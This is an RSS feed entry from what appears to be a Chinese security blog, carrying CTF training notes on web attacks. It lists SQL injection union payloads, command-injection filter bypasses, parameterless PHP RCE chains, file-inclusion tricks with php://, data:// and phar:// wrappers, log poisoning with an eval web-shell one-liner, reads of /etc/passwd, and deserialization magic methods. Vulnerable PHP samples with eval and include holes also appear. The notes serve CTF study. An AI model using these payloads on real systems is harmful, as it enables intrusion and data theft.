      <content:encoded><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select password from users where id = &quot;xiaoming&quot;</span><br><span class="line"></span><br><span class="line">select password from users where id = &quot;&quot; or 1=1#&quot; </span><br><span class="line"></span><br><span class="line">information_schema</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>schemata</th><th>tables</th><th>columns</th></tr></thead><tbody><tr><td>数据库名</td><td>schema_name</td><td></td><td></td></tr><tr><td>表名</td><td>table_schema</td><td>table_name</td><td></td></tr><tr><td>字段名</td><td>table_schema</td><td>table_name</td><td>column_name</td></tr></tbody></table><p>nianji</p><p>liuyi</p><p>name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from nianji.liuyi;</span><br></pre></td></tr></table></figure><p>联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from users union select 1,2,3;</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>1</td><td>xiaoming</td><td>xiaoming</td></tr><tr><td>1</td><td>2</td><td>3</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from users where id =1 order by 5</span><br><span class="line"></span><br><span class="line">select id,username,password from users where id =1 union select 1,2,3;</span><br><span class="line"></span><br><span class="line">union select 1,database(),3 #    查数据库名</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #    查数据表名geek</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(column_name),3 from information_schema.tables where table_name=&#x27;geek&#x27; #查字段名</span><br><span class="line"></span><br><span class="line">union select password from geek #   查最终要的数据 </span><br></pre></td></tr></table></figure><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>读写文件</p><h2 id="1-平替命令"><a href="#1-平替命令" class="headerlink" title="1.平替命令"></a>1.平替命令</h2><ul><li><p>cat 、tac</p></li><li><p>head、tail</p></li><li><p>less、more</p></li><li><p>nl</p></li><li><p>strings</p></li><li><p>paste</p></li><li><p>diff</p></li><li><p>base64 xxxx | base64 -d</p></li></ul><h2 id="2-分隔符"><a href="#2-分隔符" class="headerlink" title="2.分隔符"></a>2.分隔符</h2><ul><li>|</li><li>||</li><li>&amp;</li><li>&amp;&amp;</li><li>;</li><li>%0a</li><li>&gt;</li></ul><h2 id="3-绕过过滤"><a href="#3-绕过过滤" class="headerlink" title="3.绕过过滤"></a>3.绕过过滤</h2><ul><li>关键词过滤</li><li>\    c\at flag.php</li><li>‘ “   c’’a””t flag.php   c”a”t flag.php</li><li>通配符    ca? flag.php   cat fl*   flag.php   fl456789.php</li><li>a&#x3D;ag;b&#x3D;at;c$b fl$a.php</li><li>空格</li><li>cat&lt;&gt;flag.php</li><li>%09   %0b  %0c   %a0  ${IFS}</li><li>$IFS   cat$IFS$2flag.php       cat${IFS}flag.php</li></ul><h2 id="4-使用其他命令"><a href="#4-使用其他命令" class="headerlink" title="4.使用其他命令"></a>4.使用其他命令</h2><ul><li>&#96;</li><li>cat <code>ls</code>      index.php  flag.php readme.txt</li><li>grep -r “flag”</li><li>读取当前目录下所有文件的内容，匹配flag</li><li>base64 &#x2F;flag |  base64 -d        &#x2F;???&#x2F;????64 &#x2F;??4?.???</li><li>echo “cat &#x2F;flag【命令要base64编码】”| base64 -d | bash</li></ul><h2 id="无参rce"><a href="#无参rce" class="headerlink" title="无参rce"></a>无参rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// 对伪协议进行过滤</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">// asd(asd());    </span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure><p>localeconv() 货币信息，第一个是”点“</p><p>current()获取数组中第一个键值对</p><p>scandir()扫描指定目录</p><p>var_dump() 将变量内容进行导出</p><p>next() 将指针向后移动一位show_source()读取某个文件</p><p>readfile() 读文件</p><p>highlight_file()读文件</p><p>file()将某个文件读成数组</p><p>file_get_contents()将某个文件读成字符串</p><p>array_flip() 交换键值对</p><p>array_reverse() 反转数组</p><p>array_rand()获取数组中随机值</p><p>通用payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include include_once()</span><br><span class="line">require require_once()</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;])</span><br></pre></td></tr></table></figure><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>1.data:&#x2F;&#x2F;伪协议</p><p>a.条件</p><p>i.allow_url_fopen &#x3D;On  allow_url_include &#x3D;On</p><p>b.用法</p><p>i.data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?></p><p>ii.data:&#x2F;&#x2F;text&#x2F;plain;base,【base64编码的内容】</p><p>iii.data:,<?php phpinfo();?></p><p>2.php:&#x2F;&#x2F;input</p><p>a.条件和上面一样</p><p>b.用法：</p><p>i.include($_GET[‘file’])    ?file&#x3D;php:&#x2F;&#x2F;input</p><p>ii.$_POST:     <?php phpinfo();?></p><p>3.php:&#x2F;&#x2F;filter</p><p>a.php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.<br>php</p><p>b.<code>php://filter/read=convert.base64-encode/resource=xxx. php</code>(读文件源码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`php://filter/write=string.rot13/resource=2.php`(写入文件，相当于打开一个写入的文件流，新建一个文件并指定写的方式)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">`?file=php://filter/write=convert.iconv.UCS-2LE.</span><br><span class="line">    UCS-2BE/resource=payload.php`</span><br><span class="line">`&amp;contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?`</span><br><span class="line"></span><br><span class="line">`php://filter/resource=flag.php`(读文件源码)</span><br><span class="line"></span><br><span class="line">    `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php`(读文件源码)(每两位调换位置写入)</span><br><span class="line"></span><br><span class="line">    `php://filter/read=convert.quoted-printable-encode/resource=flag.php`(读文件源码)</span><br></pre></td></tr></table></figure><p>4.phar:&#x2F;&#x2F;</p><p>a.文件上传： zip,     shell.php -&gt; shell.zip    </p><p>b.文件包含： ?file&#x3D;phar:&#x2F;&#x2F;.&#x2F;shell.zip&#x2F;shell.php</p><p>c.注意：</p><p>i.shell.zip -&gt;shell.jpg    ?file&#x3D;phar:&#x2F;&#x2F;.&#x2F;shell.jpg&#x2F;<br>shell.php</p><p>ii.即使修改后缀，对phar读压缩包也没有影响</p><p>5.compress.zlib:&#x2F;&#x2F;flag.php</p><p>6.zip:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.zip</p><p>a.需要指定绝对路径</p><p>7.zlib:&#x2F;&#x2F;&#96;压缩流</p><p>8.    <code>compress.zlib://a.txt</code>(读文件)</p><p>9.    <code>compress.bzip2://file.bz2</code></p><p>10.http:&#x2F;x.x.x.x:81&#x2F;shell.php</p><p>日志包含</p><p>?file&#x3D;&#x2F;etc&#x2F;passwd</p><p>日志中，记录了一些关键信息：ip 请求时间  请求行  响应行  user-agent</p><p>1.常见日志路径：</p><p>a.nginx: &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>b.apache:   &#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p><p>c.&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p><p>d.&#x2F;var&#x2F;log&#x2F;secure       ssh “<?php phpinfo();?>“@x.x.x.x</p><p>2.请求的时候更改UA头，加上一句话<?php eval($_REQUEST[1])?></p><p>3.重新包含日志，传入参数看一下代码能否执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($file))</span><br><span class="line">&#123;</span><br><span class="line">if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">include ($file . &#x27;.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>怎么序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class test&#123;</span><br><span class="line">public $username;</span><br><span class="line">public $password;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public function hello()&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test&#123;</span><br><span class="line">public $username;</span><br><span class="line">public $password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new test;</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>魔法函数</p><p>__toString():   将对象以字符串形式调用</p><p>__invoke();  以函数形式调用</p><p>__get(); 调用不存在属性触发</p><p>__call()； 调用不存在方法触发</p><p>unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存<br>在，此函数可以重建对象可能具有的任何资源。</p><p>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。</p><p>__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。</p><p>__toString：当对象被当做一个字符串使用时调用。</p><p>__sleep:序列化对象之前就调用此方法(其返回需要一个数组)</p><p>__wakeup:将在反序列化之后立即被调用，反序列化恢复对象之前<br>调用该方法</p><p>__call:当调用对象中不存在的方法会自动调用该方法。</p><p>__get:在调用私有属性的时候会自动执行</p><p>__isset()在不可访问的属性上调用isset()或empty()触发</p><p>__unset()在不可访问的属性上使用unset()时触发</p><p>__invoke() 将对象当作函数来使用的时候，会自动调用该方法，<br>用“unset()”函数删除对象内部的私有成员属性时，对象会自动用__unset()函数来帮我们删除对象内部的私有成员属性。</p><p>__get()如果试图读取一个对象并不存在的属性的时候，PHP就给出错误信息。如果在类里添加__get方法，并且我们可以用这函数实现类似java中反射的各种操作。</p><h1 id="工具环境"><a href="#工具环境" class="headerlink" title="工具环境"></a>工具环境</h1><p>1.vmware workstation pro 17 及以上</p><p>2.kali <a href="https://www.kali.org/">https://www.kali.org/</a></p><p>3.windows 11 渗透系统</p><p>a.<a href="https://github.com/arch3rPro/Pentest-Windows">https://github.com/arch3rPro/Pentest-Windows</a></p><p>4.CTF toolkit</p><p>a.链接：<a href="https://share.weiyun.com/8cVhjsKl">https://share.weiyun.com/8cVhjsKl</a> 密码：233333</p><ol start="5"><li></li></ol>]]></content:encoded>
      
      
      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
      
      
      <comments>http://blog.xingxiaowu.cn/2024/06/26/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
